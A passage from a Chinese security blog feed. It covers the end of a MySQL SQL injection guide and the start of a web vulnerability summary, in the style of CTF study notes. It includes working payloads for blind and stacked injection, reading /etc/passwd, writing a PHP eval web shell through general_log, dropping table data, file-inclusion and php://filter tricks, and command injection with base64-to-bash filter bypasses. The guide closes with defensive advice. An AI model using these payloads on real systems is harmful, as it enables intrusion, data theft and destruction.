</code></pre></div></div> <ol> <li><strong>笛卡尔积</strong></li> </ol> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">A</span><span class="p">,</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="n">B</span><span class="p">;</span>
<span class="o">#</span><span class="err">尽量用超时判断</span>
</code></pre></div></div> <ol> <li><strong>get_lock</strong></li> </ol> <p>使用场景有限制，需要提供长连接。</p> <p>需先在一个 session 中锁定：</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">get_lock</span><span class="p">(</span><span class="s1">'haptian'</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</code></pre></div></div> <p>在另一个 session 中 get_lock:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">get_lock</span><span class="p">(</span><span class="s1">'haotian'</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
<span class="o">#</span><span class="err">用时</span><span class="mi">5</span><span class="err">秒</span>
</code></pre></div></div> <ol> <li><strong>正则表达式</strong></li> </ol> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">rpad</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span><span class="mi">4999999</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span> <span class="n">RLIKE</span> <span class="n">concat</span><span class="p">(</span><span class="n">repeat</span><span class="p">(</span><span class="s1">'(a.*)+'</span><span class="p">,</span><span class="mi">30</span><span class="p">),</span><span class="s1">'b'</span><span class="p">);</span>
</code></pre></div></div> <hr/> <h2 id="五无列名盲注">五、无列名盲注</h2> <h3 id="获取数据库名和表名">获取数据库名和表名</h3> <p><strong>当过滤 in/or 时候，意味着不能继续使用 information_schema 库</strong></p> <h4 id="1-sys">1. sys</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span><span class="err">查询所有的库</span>
<span class="k">SELECT</span> <span class="n">table_schema</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">schema_table_statistics</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">table_schema</span><span class="p">;</span>
<span class="k">SELECT</span> <span class="n">table_schema</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">x</span><span class="err">$</span><span class="n">schema_flattened_keys</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="n">table_schema</span><span class="p">;</span>

<span class="o">#</span><span class="err">查询指定库的表</span>
<span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">schema_table_statistics</span> <span class="k">WHERE</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">'mspwd'</span> <span class="k">GROUP</span> <span class="k">BY</span> <span class="k">table_name</span><span class="p">;</span>
</code></pre></div></div> <h4 id="2-mysql-方法不过滤-in">2. mysql 方法（不过滤 in）</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span> <span class="k">where</span> <span class="n">database_name</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
<span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_index_stats</span> <span class="k">where</span> <span class="n">database_name</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
</code></pre></div></div> <h3 id="无列名盲注方法">无列名盲注方法</h3> <h4 id="1-union-重命名法">1. union 重命名法</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">a</span><span class="p">.</span><span class="mi">2</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">)</span><span class="n">a</span><span class="p">;</span>
<span class="o">#</span><span class="err">前提是</span><span class="n">users</span><span class="err">有三列</span>
</code></pre></div></div> <h4 id="2-比较法">2. 比较法</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="p">(</span><span class="k">select</span> <span class="s1">'admin'</span><span class="p">,</span> <span class="s1">'0zzz'</span><span class="p">,</span> <span class="s1">'zzzzzzzzzz'</span><span class="p">)</span><span class="o">&lt;</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">limit</span> <span class="mi">1</span><span class="p">);</span>
</code></pre></div></div> <hr/> <h2 id="六文件操作与堆叠注入">六、文件操作与堆叠注入</h2> <h3 id="mysql-变量">MySQL 变量</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SHOW</span> <span class="n">VARIABLES</span><span class="p">;</span><span class="o">#</span><span class="err">获取</span><span class="n">MySQL</span><span class="err">全局变量</span>
<span class="k">show</span> <span class="n">variables</span> <span class="k">like</span> <span class="nv">"%secure_file%"</span><span class="p">;</span>
</code></pre></div></div> <h3 id="mysql-读文件">MySQL 读文件</h3> <h4 id="secure_file_priv">secure_file_priv</h4> <table> <tbody> <tr> <td>当 secure_file_priv 的值为 null，表示限制 mysqld 不允许导入</td> <td>导出。默认是 null</td> </tr> </tbody> </table> <table> <tbody> <tr> <td>当 secure_file_priv 的值为 /tmp/，表示限制 mysqld 的导入</td> <td>导出只能发生在 /tmp/ 目录下</td> </tr> </tbody> </table> <table> <tbody> <tr> <td>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入</td> <td>导出做限制</td> </tr> </tbody> </table> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Select</span> <span class="n">load_file</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">);</span>
<span class="k">SELECT</span> <span class="k">CONVERT</span><span class="p">(</span><span class="n">LOAD_FILE</span><span class="p">(</span><span class="nv">"/etc/passwd"</span><span class="p">)</span> <span class="k">USING</span> <span class="n">utf8</span><span class="p">);</span>
</code></pre></div></div> <h3 id="mysql-写文件">MySQL 写文件</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="nv">"&lt;?php phpinfo();?&gt;"</span> <span class="k">into</span> <span class="n">outfile</span> <span class="nv">"/tmp/1.php"</span><span class="p">;</span>
<span class="k">select</span> <span class="nv">"&lt;?php phpinfo();?&gt;"</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="nv">"/tmp/1.php"</span><span class="p">;</span>
<span class="o">#</span><span class="n">outfile</span><span class="err">函数可以导出多行，而</span><span class="n">dumpfile</span><span class="err">只能导出一行数据</span>
<span class="o">#</span><span class="n">outfile</span><span class="err">函数在将数据写到文件里时有特殊的格式转换，而</span><span class="n">dumpfile</span><span class="err">则保持原数据格式</span>
</code></pre></div></div> <p>当 secure_file_priv 为 NULL：</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span><span class="err">堆叠注入</span>
<span class="k">set</span> <span class="k">global</span> <span class="n">general_log</span><span class="o">=</span><span class="k">on</span><span class="p">;</span>
<span class="k">set</span> <span class="k">global</span> <span class="n">general_log_file</span><span class="o">=</span><span class="s1">'C:/phpStudy/WWW/789.php'</span><span class="p">;</span>
<span class="k">select</span> <span class="s1">'&lt;?php eval($_POST["a"]) ?&gt;'</span><span class="p">;</span>
</code></pre></div></div> <h3 id="堆叠注入">堆叠注入</h3> <p>MySQL 可以执行多条语句，多条语句之前用 ; 做分隔。</p> <p><strong>条件：</strong> mysqli-&gt;multi_query(sql);</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="k">delete</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
</code></pre></div></div> <hr/> <h2 id="七宽字节注入二次注入约束攻击">七、宽字节注入、二次注入、约束攻击</h2> <h3 id="宽字节注入">宽字节注入</h3> <p>宽字节注入主要是源于程序员设置数据库编码与 PHP 编码设置为不同的两个编码。</p> <p><strong>重点语句：</strong></p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="n">conn</span><span class="o">-&gt;</span><span class="n">query</span><span class="p">(</span><span class="nv">"set names 'gbk';"</span><span class="p">);</span>
</code></pre></div></div> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">用户名输入：</span><span class="k">admin</span><span class="o">%</span><span class="n">df</span><span class="s1">' or 1=1#
函数转义后为： admin%df</span><span class="se">\'</span><span class="s1"> or 1=1#
SET character_set_client ='</span><span class="n">gbk</span><span class="s1">'后：admin運'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span>
<span class="err">执行语句：</span><span class="p">...</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">'admin運'</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span><span class="s1">'
</span></code></pre></div></div> <h3 id="约束攻击">约束攻击</h3> <p>INSERT 语句：截取前 20 个字符 SELECT 语句：输入什么就是什么</p> <h3 id="二次注入">二次注入</h3> <p>攻击者构造的恶意 payload 首先会被服务器存储在数据库中，在之后取出数据库在进行 SQL 语句拼接时产生的 SQL 注入问题。</p> <p>如：留言板修改，密码修改等。</p> <hr/> <h2 id="八sql-注入绕过技巧">八、SQL 注入绕过技巧</h2> <h3 id="空格过滤绕过">空格过滤绕过</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**/</span> <span class="err">（）</span> <span class="o">%</span><span class="mi">0</span><span class="n">a</span> <span class="nv">` tap 两个空格
</span></code></pre></div></div> <h3 id="过滤-or-and-xor-not">过滤 or and xor not</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">and</span> <span class="o">=</span> <span class="o">&amp;&amp;</span>
<span class="k">or</span> <span class="o">=</span> <span class="o">||</span>
<span class="n">xor</span> <span class="o">=</span> <span class="o">|</span>
<span class="k">not</span> <span class="o">=</span> <span class="o">!</span>
</code></pre></div></div> <h3 id="过滤-">过滤 =</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">.</span><span class="err">不加通配符的</span> <span class="k">like</span> <span class="n">rlike</span>
<span class="mi">2</span><span class="p">.</span><span class="err">使用大小于号</span>
<span class="mi">3</span><span class="p">.</span><span class="err">使用</span><span class="o">!&lt;&gt;</span><span class="p">,</span><span class="o">&lt;&gt;</span><span class="err">相当于</span><span class="o">!=</span>
</code></pre></div></div> <h3 id="过滤大小于号">过滤大小于号</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">.</span><span class="n">greatest</span><span class="p">(</span><span class="n">n1</span><span class="p">,</span><span class="n">n2</span><span class="p">,</span><span class="n">n3</span><span class="p">):</span><span class="err">返回</span><span class="n">n</span><span class="err">中的最大值</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">and</span> <span class="n">greatest</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)),</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="mi">116</span><span class="p">;</span>
<span class="n">least</span><span class="err">同，返回最小值</span>

<span class="mi">2</span><span class="p">.</span><span class="n">strcmp</span><span class="p">(</span><span class="n">str1</span><span class="p">,</span><span class="n">str2</span><span class="p">):</span><span class="err">若所有的字符串均相同，则返回</span><span class="n">STRCMP</span><span class="p">()</span><span class="err">，若根据当前分类次序，第一个参数小于第二个，则返回</span> <span class="o">-</span><span class="mi">1</span><span class="err">，其它情况返回</span> <span class="mi">1</span>

<span class="mi">3</span><span class="p">.</span><span class="k">in</span>

<span class="mi">4</span><span class="p">.</span><span class="k">between</span>
</code></pre></div></div> <h3 id="过滤引号绕过">过滤引号绕过</h3> <p>使用十六进制编码：</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">column_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span><span class="p">;</span>
</code></pre></div></div> <p>宽字节：</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">用</span><span class="o">%</span><span class="n">df</span><span class="s1">'代替
</span></code></pre></div></div> <h3 id="过滤逗号">过滤逗号</h3> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">.</span><span class="k">select</span> <span class="n">substr</span><span class="p">(</span><span class="nv">"string"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
<span class="err">可替换为：</span><span class="k">select</span> <span class="n">substr</span><span class="p">(</span><span class="nv">"string"</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">3</span><span class="p">);</span><span class="o">#</span><span class="err">从</span><span class="mi">1</span><span class="err">开始读</span><span class="mi">3</span><span class="err">个长度的字符串</span>

<span class="mi">2</span><span class="p">.</span><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
<span class="err">可用</span><span class="k">join</span><span class="err">：</span><span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span> <span class="k">join</span><span class="p">(</span><span class="k">select</span> <span class="mi">3</span><span class="p">)</span><span class="k">c</span>
</code></pre></div></div> <h3 id="过滤-select">过滤 select</h3> <ol> <li><strong>使用 handler</strong></li> </ol> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">handler</span> <span class="n">users</span><span class="err">（表）</span> <span class="k">open</span> <span class="k">as</span> <span class="n">hd</span><span class="p">;</span> <span class="o">#</span><span class="err">指定数据表进行载入并将返回句柄重命名</span>
<span class="k">handler</span> <span class="n">hd</span> <span class="k">read</span> <span class="k">first</span><span class="p">;</span> <span class="o">#</span><span class="err">读取指定表</span><span class="o">/</span><span class="err">句柄的首行数据</span>
<span class="k">handler</span> <span class="n">hd</span> <span class="k">read</span> <span class="k">next</span><span class="p">;</span> <span class="o">#</span><span class="err">读取指定表</span><span class="o">/</span><span class="err">句柄的下一行数据</span>
<span class="k">handler</span> <span class="n">hd</span> <span class="k">close</span><span class="p">;</span> <span class="o">#</span><span class="err">关闭句柄</span>
</code></pre></div></div> <ol> <li><strong>使用 rename</strong></li> </ol> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">';
RENAME TABLE `words` TO `words2`;
RENAME TABLE `1919810931114514` TO `words`;
ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#
</span></code></pre></div></div> <ol> <li><strong>MySQL 预处理</strong></li> </ol> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="s1">';PREPARE st from concat('</span><span class="n">s</span><span class="s1">','</span><span class="n">elect</span><span class="s1">', '</span> <span class="o">*</span> <span class="k">from</span> <span class="nv">`1919810931114514`</span> <span class="s1">');EXECUTE st;#
#prepare后接语句，所以可以使用字符串操作，拼接等
</span></code></pre></div></div> <hr/> <h2 id="总结">总结</h2> <p>MySQL 注入是 Web 安全中常见的漏洞类型，掌握各种注入方法和绕过技巧对于安全测试和防护都至关重要。在实际应用中，应该：</p> <ol> <li>使用参数化查询（Prepared Statements）</li> <li>对用户输入进行严格验证和过滤</li> <li>使用最小权限原则</li> <li>定期进行安全审计和渗透测试</li> </ol>]]></content><author><name></name></author><category term="Web安全"/><category term="Web安全"/><category term="SQL注入"/><category term="MySQL"/><category term="安全"/><summary type="html"><![CDATA[MySQL SQL 注入攻击的完整指南，包括联合查询、报错注入、盲注、绕过技巧等]]></summary></entry><entry><title type="html">Web 安全漏洞总结</title><link href="https://gewenhao.win/blog/2023/Web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="Web 安全漏洞总结"/><published>2023-08-15T14:00:00+00:00</published><updated>2023-08-15T14:00:00+00:00</updated><id>https://gewenhao.win/blog/2023/Web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</id><content type="html" xml:base="https://gewenhao.win/blog/2023/Web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"><![CDATA[<h1 id="web-安全漏洞总结">Web 安全漏洞总结</h1> <p>本文总结了 Web 安全中常见的漏洞类型，包括文件包含、命令注入、反序列化以及其他数据库注入方法。</p> <hr/> <h2 id="一文件包含漏洞">一、文件包含漏洞</h2> <h3 id="php-文件包含">PHP 文件包含</h3> <h4 id="文件包含相关函数">文件包含相关函数</h4> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">include</span><span class="p">()</span>
<span class="k">include_once</span><span class="p">()</span>
<span class="k">require</span><span class="p">()</span>
<span class="k">require_once</span><span class="p">()</span>
</code></pre></div></div> <h4 id="远程文件包含">远程文件包含</h4> <p><strong>远程代码执行：</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=[http|https|ftp]://example.com/shell.txt
(需要allow_url_fopen=On并且 allow_url_include=On)
</code></pre></div></div> <p><strong>利用 php 流 input：</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?file=php://input
(需要allow_url_include=On)
</code></pre></div></div> <h4 id="本地文件包含">本地文件包含</h4> <p><strong>可以做什么：</strong></p> <ul> <li>包含同目录下的文件</li> <li>获取 web 目录或者其他配置文件</li> <li>包含上传的附件：<code class="language-plaintext highlighter-rouge">?file=../attachment/media/xxx.file</code></li> <li>读取 phpinfo 可以包含临时文件</li> <li>包含/读取 session 文件：<code class="language-plaintext highlighter-rouge">?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</code></li> </ul> <p><strong>如何读文件：</strong></p> <ol> <li>直接包含非 php 文件</li> <li>利用 PHP 文件流包含</li> </ol> <p><strong>示例：</strong></p> <ol> <li>使用 data:// 协议加 base64 绕过 “hello123”：</li> </ol> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">abc</span><span class="o">=</span><span class="n">data</span><span class="o">://</span><span class="n">text</span><span class="o">/</span><span class="n">plain</span><span class="p">;</span><span class="n">base64</span><span class="p">,</span><span class="n">aGVsbG8xMjM</span><span class="o">=&amp;</span><span class="n">file</span><span class="o">=</span><span class="n">php</span><span class="o">://</span><span class="n">filter</span><span class="o">/</span><span class="n">convert</span><span class="mf">.</span><span class="n">base64</span><span class="o">-</span><span class="n">encode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">flag</span><span class="mf">.</span><span class="n">php</span>
</code></pre></div></div> <ol> <li> <p>使用 php://filter/convert.base64-encode/resource=flag.php 绕过</p> </li> <li> <p>除了 base64-encode 还有一个常用的是 string.rot13 编码</p> </li> <li> <p>使用 iconv 编码转换：</p> </li> </ol> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?page=php://filter/convert.iconv.ASCII.UCS-2BE/resource=index.php
</code></pre></div></div> <p><strong>可以尝试二次 url 编码绕过关键词</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:2335/?page=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=index.php
原理：php包含的filter，包含时会再解一次url编码
</code></pre></div></div> <h4 id="session-包含">Session 包含</h4> <p><strong>一、直接上传包含</strong></p> <ol> <li>首先查看 phpinfo(), save_path 为 no value 则表示存储在默认的 /tmp 或 /var/lib/php/session 目录下</li> <li>php 代码为：<code class="language-plaintext highlighter-rouge">$_SESSION["username"]=$ctfs;</code></li> <li>当提交为：<code class="language-plaintext highlighter-rouge">?ctfs=&lt;?php phpinfo();?&gt;</code></li> <li>内容会被保存在 tmp 目录或者 /var/lib/php/session 目录下</li> <li>直接访问：<code class="language-plaintext highlighter-rouge">?file=/tmp/sess_(session_id)</code></li> </ol> <p><strong>二、临时文件包含</strong></p> <ol> <li><strong>条件竞争：</strong> 删除临时文件、包含临时文件</li> <li><strong>php7.0 时：</strong></li> </ol> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">file</span><span class="o">=</span><span class="n">php</span><span class="o">://</span><span class="n">filter</span><span class="o">/</span><span class="n">string</span><span class="mf">.</span><span class="n">strip_tags</span><span class="o">/</span><span class="n">resource</span><span class="o">=/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
</code></pre></div></div> <p>会造成一个 segment fault，临时文件不会被删除。</p> <ol> <li><strong>自包含：</strong> 自己包含自己 进入死循环 脚本永不结束</li> </ol> <h3 id="nodejs-与-python-任意文件读取">NodeJS 与 Python 任意文件读取</h3> <h4 id="nodejs-任意文件读取">NodeJS 任意文件读取</h4> <p><strong>目录穿越：</strong></p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">path</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="nx">file</span><span class="p">));</span>
</code></pre></div></div> <p>直接请求 <code class="language-plaintext highlighter-rouge">/public/../app.js</code> 浏览器会去除 <code class="language-plaintext highlighter-rouge">../</code></p> <p>使用 <code class="language-plaintext highlighter-rouge">curl --path-as-is example.com/public/../app.js</code> 但其会将 <code class="language-plaintext highlighter-rouge">../</code> 解析成路由一部分</p> <p>所以将 <code class="language-plaintext highlighter-rouge">../</code> 中 <code class="language-plaintext highlighter-rouge">/</code> url 编码，访问 <code class="language-plaintext highlighter-rouge">/public/..%2fapp.js</code></p> <h4 id="python-任意文件读取">Python 任意文件读取</h4> <p><strong>目录穿越</strong></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp</span><span class="sh">'</span><span class="p">,</span> <span class="nb">file</span><span class="p">)</span>
</code></pre></div></div> <p>利用：</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">../etc/flag</span><span class="sh">'</span><span class="p">);</span>
</code></pre></div></div> <p>当过滤了 <code class="language-plaintext highlighter-rouge">./</code> 时：</p> <p>利用 python 特性直接从根目录开始写：</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">'</span><span class="s">/tmp</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">/usr/local/app/app.js</span><span class="sh">'</span><span class="p">);</span>
<span class="n">其会返回后一个根目录路径</span>
</code></pre></div></div> <hr/> <h2 id="二命令注入">二、命令注入</h2> <h3 id="高危函数">高危函数</h3> <p><strong>代码注入：</strong></p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">eval</span><span class="p">()</span><span class="err">、</span><span class="nb">assert</span><span class="p">()</span><span class="err">、</span><span class="nb">preg_replace</span><span class="p">()</span><span class="err">、</span><span class="nb">call_user_func</span><span class="p">()</span><span class="n">等等</span>
</code></pre></div></div> <p><strong>命令执行：</strong></p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">system</span><span class="p">()</span><span class="err">、</span><span class="nb">exec</span><span class="p">()</span><span class="err">、</span><span class="nb">shell_exec</span><span class="p">()</span><span class="err">、</span><span class="nb">passthru</span><span class="p">()</span><span class="err">、</span><span class="nf">pctnl_exec</span><span class="p">()</span><span class="err">、</span><span class="nb">popen</span><span class="p">()</span><span class="err">、</span><span class="nb">proc_open</span><span class="p">()</span>
<span class="n">注</span><span class="err">：</span><span class="nf">反引号是shell_exec</span><span class="p">()</span><span class="n">的别名</span>
</code></pre></div></div> <p><strong>示例：</strong></p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">];</span>
    <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"ping -c 4 "</span> <span class="mf">.</span> <span class="nv">$ip</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?ip=127.0.0.1;ls%20-a即可利用
</code></pre></div></div> <h3 id="联合执行可利用的符号">联合执行可利用的符号</h3> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="n">无论前边运行成功还是出现错误</span><span class="err">，</span><span class="n">都运行后边</span>
<span class="o">&amp;&amp;</span> <span class="n">前边成功结束才运行后边</span>
<span class="o">||</span> <span class="n">只有前边错误后边才执行</span>
<span class="o">|</span> <span class="n">将前一个命令的输出作为后一个命令的输入</span>
<span class="o">%</span><span class="mi">0</span><span class="n">a</span> <span class="o">%</span><span class="mi">0</span><span class="n">d</span> <span class="n">换行符</span>
<span class="sb">`cat flag`</span> <span class="n">反引号内联执行</span>
<span class="n">在Linux</span> <span class="n">bash中可以使用</span><span class="p">{</span><span class="no">OS_COMMAND</span><span class="p">,</span><span class="no">ARGUMENT</span><span class="p">}</span><span class="n">来执行系统命令</span><span class="p">{</span><span class="n">cat</span><span class="p">,</span><span class="n">flag</span><span class="p">}</span>
</code></pre></div></div> <h3 id="绕过技巧">绕过技巧</h3> <h4 id="空格绕过">空格绕过</h4> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$IFS</span>
<span class="err">$</span><span class="p">{</span><span class="no">IFS</span><span class="p">}</span> <span class="err">（</span><span class="n">常用</span><span class="err">）</span>
<span class="nv">$IFS</span><span class="err">$</span><span class="mi">9</span>
<span class="o">&lt;</span>
<span class="o">&lt;&gt;</span>
<span class="p">{</span><span class="n">cat</span><span class="p">,</span><span class="n">flag</span><span class="mf">.</span><span class="n">php</span><span class="p">}</span> <span class="c1">// 用逗号实现了空格功能，需要用 {} 括起来</span>
<span class="o">%</span><span class="mi">20</span>
<span class="o">%</span><span class="mi">09</span>
</code></pre></div></div> <h4 id="关键字绕过">关键字绕过</h4> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. 反斜线绕过</span>
<span class="n">ca\t</span> <span class="n">y1n\g</span><span class="mf">.</span><span class="n">php</span>

<span class="c1">// 2. 两个单引号绕过</span>
<span class="n">cat</span> <span class="n">y</span><span class="s1">''</span><span class="n">ng</span><span class="mf">.</span><span class="n">php</span>

<span class="c1">// 3. base64 编码绕过</span>
<span class="k">echo</span> <span class="s2">"Y2F0IHkxbmcucGhw"</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="o">|</span> <span class="n">bash</span>
<span class="sb">`echo "Y2F0IHkxbmcucGhw" | base64 -d`</span>

<span class="c1">// 4. hex 编码绕过</span>
<span class="k">echo</span> <span class="s2">"6361742079316E672E706870"</span> <span class="o">|</span> <span class="n">xxd</span> <span class="o">-</span><span class="n">r</span> <span class="o">-</span><span class="n">p</span> <span class="o">|</span> <span class="n">bash</span>

<span class="c1">// 5. 用 [] 匹配</span>
